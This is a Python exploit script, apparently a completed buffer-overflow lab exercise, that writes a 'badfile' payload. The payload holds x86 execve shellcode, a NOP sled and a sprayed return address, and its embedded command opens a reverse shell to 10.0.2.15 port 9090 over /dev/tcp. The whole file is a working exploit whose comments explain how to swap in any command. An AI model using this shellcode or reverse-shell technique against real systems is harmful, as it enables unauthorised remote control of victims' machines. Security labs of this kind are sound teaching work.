#!/usr/bin/python3
import sys

# The program takes the address of the buffer from the command line
buf_addr = int(sys.argv[1], 16)

shellcode= (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 
#print(len(shellcode))
##################################################################
# Put the shellcode somewhere in the payload
#start = 0               # Change this number 
#content[start:start + len(shellcode)] = shellcode
content[517 - len(shellcode):] = shellcode # put shellcode at the end of badfile
# Decide the return address value 
# and put it somewhere in the payload
#ret    = buf_addr + (517 - len(shellcode))     # Change this number 
ret     = buf_addr + 352
#offset = 0              # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
#content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
#for i in range(517 - len(shellcode) - 4, 0, 4):
#    content[i:i + 4] = (ret).to_bytes(4,byteorder='little')
for offset in range(78):
    content[offset*4:(offset+1)*4] = (ret).to_bytes(4,byteorder='little')
##################################################################
#print(content)
#print(len(content))
# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
